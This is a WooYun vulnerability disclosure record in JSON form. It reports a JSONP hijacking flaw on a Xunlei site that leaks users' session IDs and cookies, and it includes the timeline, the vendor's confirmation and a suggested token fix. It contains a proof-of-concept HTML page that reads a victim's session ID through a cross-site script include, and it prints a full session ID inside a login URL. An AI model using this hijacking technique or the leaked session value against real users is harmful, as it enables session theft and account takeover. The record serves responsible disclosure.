{"id": 28684, "wybug_id": "wooyun-2015-0121639", "wybug_title": "迅雷某站jsonp劫持漏洞泄漏会话ID，cookie", "wybug_corp": "迅雷", "wybug_author": "xxyyzz", "wybug_date": "2015-06-19 16:57", "wybug_open_date": "2015-08-03 17:34", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向公众公开  简要描述： 迅雷某站jsonp漏洞泄漏会话ID，cookie 详细说明：  近期jsonp漏洞又火了。迅雷http://dynamic.cloud.vip.xunlei.com站点存在jsonp劫持漏洞，可以获得会话session ID.登录获得会话ID\n\n访问某请求获得返回数据，包含会话ID\n\n在自己的站点劫持会话ID\n\n\n<html><head>test jsonp</head><meta content=\"text/html;charset=utf-8\" http-equiv=\"Content-Type\"/><script type=\"text/javascript\">\tfunction jQuery172045779833855056007_1434698393536(result){\talert(result.need_setcookie.lx_sessionid);\t//alert(result.need_setcookie);\t/*\tfor(var i in result){\t\talert(i+\":\"+result[i]);\t\t}*/\t}</script><script type=\"text/javascript\" src=\"http://dynamic.cloud.vip.xunlei.com/interface/get_userinfo?callback=jQuery172045779833855056007_1434698393536&userid=&_=1434698393757\"></script></html>\n使用此会话ID可访问各站点，如迅雷安全中心：http://jump.xunlei.com/sessionid/?sessionid=35B7F8B1FC712C172722A2A5369B0BDB8CCFEBD92A1952014AB9FB913535725B67C995891D73045878EAEE337110CC971B6A41CCF00B57C0E30907C6828F146E&u1=http://aq.xunlei.com/?redirecturl=aqmail   漏洞证明：  近期jsonp漏洞又火了。迅雷http://dynamic.cloud.vip.xunlei.com站点存在jsonp劫持漏洞，可以获得会话session ID.登录获得会话ID\n\n访问某请求获得返回数据，包含会话ID\n\n在自己的站点劫持会话ID\n\n\n<html><head>test jsonp</head><meta content=\"text/html;charset=utf-8\" http-equiv=\"Content-Type\"/><script type=\"text/javascript\">\tfunction jQuery172045779833855056007_1434698393536(result){\talert(result.need_setcookie.lx_sessionid);\t//alert(result.need_setcookie);\t/*\tfor(var i in result){\t\talert(i+\":\"+result[i]);\t\t}*/\t}</script><script type=\"text/javascript\" src=\"http://dynamic.cloud.vip.xunlei.com/interface/get_userinfo?callback=jQuery172045779833855056007_1434698393536&userid=&_=1434698393757\"></script></html>\n   修复方案：  添加随机token。   版权声明：转载请注明来源 xxyyzz@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-19 17:32 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-23 09:13 |    \t\txxyyzz \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:6        | 123456)\t\t \n  为毛只有2rank？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}